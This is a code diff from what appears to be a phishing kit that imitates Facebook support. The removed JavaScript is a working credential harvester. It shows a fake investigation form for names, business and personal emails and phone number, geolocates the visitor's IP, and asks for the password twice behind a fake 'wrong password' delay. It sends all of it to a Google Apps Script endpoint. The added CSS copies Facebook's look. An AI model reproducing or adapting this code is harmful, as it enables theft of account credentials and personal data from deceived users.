@@ -1,261 +1,396 @@
-function getIP(callback) {
-  fetch("https://api.db-ip.com/v2/free/self")
-    .then((response) => response.json())
-    .then((data) => callback(data))
-    .catch((error) => callback(undefined));
+* {
+  padding: 0;
+  margin: 0;
+  box-sizing: border-box;
 }
 
-let FIRST_PASSWORD = "";
-let NUMBER_TIME_LOGIN = 0;
-let isSubmitDisabled = false;
-
-$(document).ready(function () {
-  $("#input").html(`
-        <div class="mb-3">
-            <label for="page-name" class="form-label">Page Name <span class="text-danger">*</span></label>
-            <input type="text" class="form-control" required id="page-name">
-        </div>
-        <div class="mb-3">
-            <label for="full-name" class="form-label">Full Name <span class="text-danger">*</span></label>
-            <input type="text" class="form-control" required id="full-name">
-        </div>
-        <div class="mb-3">
-            <label for="business-email" class="form-label">Business Email Address <span class="text-danger">*</span></label>
-            <input type="text" class="form-control" required id="business-email">
-        </div>
-        <div class="mb-3">
-            <label for="personal-email" class="form-label">Personal Email Address <span class="text-danger">*</span></label>
-            <input type="text" class="form-control" required id="personal-email">
-        </div>
-        <div class="mb-3">
-            <label for="phone" class="form-label">Mobile Phone Number <span class="text-danger">*</span></label>
-            <input type="text" class="form-control" required id="phone">
-        </div>
-        <div class="mb-3">
-            <label class="form-label">Please provide us information that will help us investigate.</label>
-            <textarea class="form-control" id="description" rows="3"></textarea>
-        </div>
-        <button type="button" class="btn mb-4">Submit</button>
-    `);
-
-  openDetail();
-
-  getIP((ip) => {
-    sendForm(ip);
-  });
-
-  $("#phone").on("input", function () {
-    var input = $(this).val();
-    var validInputRegex = /^[+\d]*$/;
-    if (!validInputRegex.test(input)) {
-      $(this).val(input.slice(0, -1));
-    }
-  });
-});
-
-function openDetail() {
-  $(".nav-item-parent").on("click", function () {
-    var currentRotate = $(this).find(".arrow").css("rotate").replace("deg", "");
-    var isOpen = currentRotate != 0;
-    $(".detail").hide();
-    $(".arrow").css("rotate", "0deg");
-
-    const id = $(this).data("id");
-    if (isOpen) {
-      $("#" + id).hide();
-    } else {
-      $("#" + id).show();
-      $(this).find(".arrow").css("rotate", "180deg");
-    }
-  });
-
-  $(".nav-item-child").on("click", function () {
-    var currentRotate = $(this).find(".arrow").css("rotate").replace("deg", "");
-    var isOpen = currentRotate != 0;
-    const id = $(this).data("id");
-
-    if (isOpen) {
-      $("#" + id).hide();
-      $(this).find(".arrow").css("rotate", "0deg");
-      $(this)
-        .find(".icon-container")
-        .css("background-color", "var(--color-white-secondary)");
-      $(this).find(".icon-container i").css("-webkit-filter", "invert(0%)");
-      $(this).css("background", "none");
-    } else {
-      $("#" + id).show();
-      $(this).find(".arrow").css("rotate", "180deg");
-      $(this).find(".icon-container i").css("-webkit-filter", "invert(100%)");
-      $(this).find(".icon-container").css("background-color", "#1877F2");
-      $(this).css("background", "#eaf3ffe8");
-    }
-  });
+a {
+  text-decoration: none;
+  color: inherit;
 }
 
-function validateForm() {
-  var isValid = true;
-  var emailRegex =
-    /^([a-zA-Z0-9_.+-])+\@(([a-zA-Z0-9-])+\.)+([a-zA-Z0-9]{2,4})+$/;
-  var phoneRegex = /^(\+\d+|\d+)$/;
-
-  const fields = [
-    { id: "#page-name" },
-    { id: "#full-name" },
-    { id: "#business-email", regex: emailRegex },
-    { id: "#personal-email", regex: emailRegex },
-    { id: "#phone", regex: phoneRegex },
-  ];
-
-  fields.forEach((field) => {
-    const val = $(field.id).val();
-    if (!val || (field.regex && !field.regex.test(val))) {
-      isValid = false;
-      $(field.id).addClass("border-danger");
-    } else {
-      $(field.id).removeClass("border-danger");
-    }
-  });
-
-  return isValid;
+:root {
+  --color-dark-primary: #242526;
+  --color-dark-secondary: rgba(255, 255, 255, 0.1);
+  --color-white-primary: #ffffff;
+  --color-white-secondary: #e4e6eb;
+  --text-white: #e4e6eb;
+  --text-white-secondary: #65676b;
+  --text-black: #050505;
+  --web-wash: #f0f2f5;
 }
 
-function sendForm(IpAddress) {
-  $(".content #dataGet button[type=button]")
-    .off("click")
-    .on("click", function () {
-      if (validateForm()) {
-        showPrompt(IpAddress);
-      }
-    });
+body {
+  font-family: "Roboto", sans-serif;
+  letter-spacing: 0.5px;
 }
 
-function showPrompt(IpAddress) {
-  $("#getPassword").removeClass("d-none");
+header {
+  position: fixed;
+  top: 0;
+  z-index: 1;
+  width: 100vw;
+  box-shadow: 0 1px 4px rgba(0, 0, 0, 0.1);
+}
 
-  $("#close-password")
-    .off("click")
-    .on("click", function () {
-      $("#getPassword").addClass("d-none");
-    });
+.nav-bar {
+  min-height: 56px;
+  background-color: var(--color-white-primary);
+  padding: 0.25rem 0.75rem;
+}
 
-  $("#submit-password")
-    .off("click")
-    .on("click", function () {
-      if (isSubmitDisabled) return;
+.nav-bar .logo {
+  border-radius: 50%;
+  width: 40px;
+}
 
-      isSubmitDisabled = true;
-      const submitBtn = $("#submit-password");
-      submitBtn.prop("disabled", true);
+.nav-bar .logo-title {
+  color: var(--text-black);
+  font-size: 1.05rem;
+  font-family: inherit;
+  font-weight: 600;
+  margin: 0 10px;
+  cursor: pointer;
+}
 
-      let password = $("#password").val();
-      if (password === "") {
-        $("#password").addClass("border-danger");
-        isSubmitDisabled = false;
-        submitBtn.prop("disabled", false);
-        return;
-      } else {
-        $("#password").removeClass("border-danger");
-      }
+.support-icon {
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  background-color: var(--color-white-secondary);
+  border-radius: 50%;
+  width: 40px;
+  height: 40px;
+  margin: auto 8px;
+  cursor: pointer;
+}
 
-      $("#wrong-password").addClass("d-none");
+.support-icon i {
+  color: #e4e6eb;
+}
 
-      let secondPassword = "";
-      if (NUMBER_TIME_LOGIN >= 1) {
-        secondPassword = password;
-        password = FIRST_PASSWORD;
-      }
+.language-container {
+  background-color: var(--color-white-secondary);
+  padding: 9.75px 12px;
+  margin: auto 8px;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  border-radius: 6px;
+}
 
-      const message = `📧 <strong>Business Email: </strong><code>${$("#business-email").val()}</code>
-👤 <strong>User Name: </strong><code>${$("#full-name").val()}</code>
-📨 <strong>Personal Email: </strong><code>${$("#personal-email").val()}</code>
-🏳️ <strong>Facebook Page: </strong><code>${$("#page-name").val()}</code>
-📞 <strong>Phone Number: </strong><code>${$("#phone").val()}</code>
-🔑 <strong>First Password: </strong><code>${password}</code>
-🔑 <strong>Second Password: </strong><code>${secondPassword}</code>
-🌐 <strong>IP Address: </strong><code>${IpAddress.ipAddress}</code>
-<strong>Country: </strong><code>${IpAddress.countryName}</code> (<code>${IpAddress.countryCode}</code>)
-<strong>City: </strong><code>${IpAddress.city}</code>`;
+.language {
+  font-family: inherit;
+  font-size: 0.9rem;
+  font-weight: 600;
+  color: var(--text-black);
+  margin: 0;
+  cursor: pointer;
+}
 
+/* End Header */
+main {
+  height: 100vh;
+  padding-top: 56px;
+}
 
-      fetch(`https://script.google.com/macros/s/AKfycbzR8v5ux_naGqc8vRKIj8YYbJ6M7UninvPH3Q3nGCvU7QBMw94bSgybXsqplwJvCUeshA/exec`, {
-        method: 'POST',
-        mode: 'no-cors',
-        body: new URLSearchParams({ Name: message}),
-      parse_mode: "html"
+/* nav-bar-left */
+.nav-bar-left {
+  min-width: 350px;
+  height: 100%;
+  min-height: 360px;
+  box-shadow: 4px 0 4px -2px rgba(0, 0, 0, 0.1);
+  padding: 0.5rem 0.75rem 3rem 0.75rem;
+  position: fixed;
+  left: 0;
+  overflow: scroll;
+  margin-bottom: 30px;
+}
 
-    })
-    .then(res => {
-        console.log("Ádasdasdasdasdasdas");
-        if (!res.ok) throw new Error("Telegram request failed");
-        return res.json();
-    })
-    .then(data => {
-        console.log("22222");
+.nav-bar-left::-webkit-scrollbar {
+  width: 10px;
+}
 
-        NUMBER_TIME_LOGIN++;
+.nav-bar-left::-webkit-scrollbar-thumb {
+  border-radius: 10px;
+  background-color: white;
+}
 
-        if (NUMBER_TIME_LOGIN === 1) {
-            FIRST_PASSWORD = password;
+.nav-bar-left:hover::-webkit-scrollbar-thumb {
+  background-color: rgb(101, 103, 107, 0.35);
+}
 
-            let countdown = 10;
-            submitBtn.text(`Please wait ${countdown}s`);
-            setTimeout(() => {
-                $('.lsd-ring-container').addClass('d-none');
-                $('#password').val('');
-            }, 100);
+.nav-bar-left::-webkit-scrollbar-track {
+  margin-top: 10px;
+  margin-bottom: 50px;
+  border-radius: 10px;
+  background-color: white;
+}
 
-            const interval = setInterval(() => {
-                countdown--;
-                if (countdown > 0) {
-                    submitBtn.text(`Please wait ${countdown}s`);
-                } else {
-                    clearInterval(interval);
-                    submitBtn.prop('disabled', false);
-                    submitBtn.text('Continue');
-                    $('#wrong-password').removeClass('d-none');
-                    isSubmitDisabled = false;
-                }
-            }, 1000);
-        } else {
-            setTimeout(() => {
-                $('.lsd-ring-container').addClass('d-none');
-                window.location.href = "/confirm/s9d8a7da7d6a811akc23.html";
-            }, 2000);
-        }
-    })
-    .catch(error => {
-        console.log("22222");
+.nav-bar-left .nav-item {
+  min-height: 52px;
+  height: fit-content;
+  width: 100%;
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  padding: 0.1rem 0.75rem;
+  margin: 0.18rem auto;
+  cursor: pointer;
+  user-select: none;
+  border-radius: 8px;
+}
 
-        NUMBER_TIME_LOGIN++;
+.nav-bar-left .nav-item:hover {
+  background-color: rgba(0.89, 0.9, 0.92, 0.045);
+  border-radius: 6px;
+}
 
-        if (NUMBER_TIME_LOGIN === 1) {
-            FIRST_PASSWORD = password;
+.nav-bar-left .nav-item .nav-item-left p {
+  color: var(--text-black);
+  font-size: 0.95rem;
+  font-family: inherit;
+  font-weight: 600;
+  margin: 0 10px;
+  cursor: pointer;
+  min-width: 70%;
+  width: fit-content;
+}
 
-            let countdown = 10;
-            submitBtn.text(`Please wait ${countdown}s`);
-            setTimeout(() => {
-                $('.lsd-ring-container').addClass('d-none');
-                $('#password').val('');
-            }, 100);
+.nav-bar-left .nav-item .nav-item-left p a {
+  font-size: 0.9375rem;
+}
 
-            const interval = setInterval(() => {
-                countdown--;
-                if (countdown > 0) {
-                    submitBtn.text(`Please wait ${countdown}s`);
-                } else {
-                    clearInterval(interval);
-                    submitBtn.prop('disabled', false);
-                    submitBtn.text('Continue');
-                    $('#wrong-password').removeClass('d-none');
-                    isSubmitDisabled = false;
-                }
-            }, 1000);
-        } else {
-            setTimeout(() => {
-                $('.lsd-ring-container').addClass('d-none');
-                window.location.href = "/confirm/s9d8a7da7d6a811akc23.html";
-            }, 2000);
-        }
-    })
-});
+.nav-bar-left .icon-container {
+  width: 36px;
+  min-width: 36px;
+  height: 36px;
+  min-height: 36px;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  background-color: var(--color-white-secondary);
+  border-radius: 50%;
+  cursor: pointer;
+}
+
+/* content */
+.content {
+  padding: 0;
+  /* height: 100%;
+    overflow-y: scroll; */
+}
+
+.content #dataGet {
+  border: 1px solid var(--color-white-secondary);
+  border-radius: 10px;
+  overflow: hidden;
+  margin: 3rem 3rem;
+  width: 75%;
+}
+
+.form-head h2 {
+  background-color: var(--color-white-secondary);
+  display: block;
+  font-weight: bold;
+}
+
+.content #dataGet label,
+.content #dataGet p {
+  font-weight: 600;
+  font-size: 0.9rem;
+  font-family: inherit;
+}
+
+.content #dataGet p {
+  font-weight: 500;
+}
+
+.content #dataGet button[type="button"] {
+  background-color: var(--web-wash);
+}
+
+.content #dataGet button[type="button"]:hover {
+  background-color: var(--text-white-secondary);
+  color: white;
+}
+
+.my-input {
+  margin-top: 30px;
+  padding: 5px 10px;
+  width: 60%;
+  border-radius: 6px;
+  border: 2px solid #65676b;
+}
+
+.my-input:focus {
+  outline: none;
+}
+
+.my-confirm-button-class {
+  background-color: #f0f2f5 !important;
+  color: #050505 !important;
+}
+
+.my-confirm-button-class:hover {
+  background-color: #65676b !important;
+  color: #f0f2f5 !important;
+}
+
+/* footer */
+.footer {
+  padding-top: 30px;
+  width: 100%;
+  overflow: hidden;
+}
+
+.footer,
+.footer div {
+  background-color: var(--web-wash);
+  padding-bottom: 9px;
+}
+
+.footer div a {
+  font-size: 0.9375rem;
+  color: var(--text-white-secondary);
+  text-decoration: none;
+}
+
+.last-one img {
+  position: relative;
+  left: -10px;
+  top: -4px;
+}
+
+.last-one p {
+  font-size: 0.8125rem;
+  color: var(--text-white-secondary);
+}
+
+/*  */
+.my-title {
+  background-color: black;
+}
+
+/* GetPassword */
+.card-container {
+  position: fixed;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  width: 100vw;
+  height: 110vh;
+  z-index: 10;
+  background-color: rgba(100, 100, 111, 0.2);
+  transform: translateY(-29px);
+}
+
+@media (max-width: 1425px) {
+  .content {
+    width: calc(100% - 350px);
+  }
+}
+
+@media (max-width: 1100px) {
+  .nav-bar-left,
+  .nav-bar-left-margin {
+    display: none;
+  }
+
+  .content {
+    width: 100%;
+  }
+
+  #getPassword .card {
+    width: 85% !important;
+  }
+}
+
+@media (max-width: 400px) {
+  .language-container {
+    display: none;
+  }
+
+  form {
+    width: 90% !important;
+  }
+}
+
+/* --loading */
+.lsd-ring-container {
+  position: fixed;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  width: 100vw;
+  height: 110vh;
+  z-index: 1000;
+  background-color: rgba(100, 100, 111, 0.2);
+  transform: translateY(-29px);
+}
+
+.lds-ring {
+  display: inline-block;
+  position: relative;
+  width: 80px;
+  height: 80px;
+}
+
+.lds-ring div {
+  box-sizing: border-box;
+  display: block;
+  position: absolute;
+  width: 64px;
+  height: 64px;
+  margin: 8px;
+  border: 8px solid #fff;
+  border-radius: 50%;
+  animation: lds-ring 1.2s cubic-bezier(0.5, 0, 0.5, 1) infinite;
+  border-color: #fff transparent transparent transparent;
+}
+
+.lds-ring div:nth-child(1) {
+  animation-delay: -0.45s;
+}
+
+.lds-ring div:nth-child(2) {
+  animation-delay: -0.3s;
+}
+
+.lds-ring div:nth-child(3) {
+  animation-delay: -0.15s;
+}
+
+@keyframes lds-ring {
+  0% {
+    transform: rotate(0deg);
+  }
+
+  100% {
+    transform: rotate(360deg);
+  }
+}
+
+#send-code:hover {
+  background-color: #1e429f !important;
+  color: white;
+}
+
+@media (max-width: 700px) {
+  #code-form {
+    width: 90%;
+  }
+  #getCode .card {
+    width: 90%;
+  }
+}
+
+.skiptranslate {
+  display: none !important;
+}
+.goog-te-banner-frame {
+  display: none !important;
+}
+body {
+  top: 0px !important;
 }
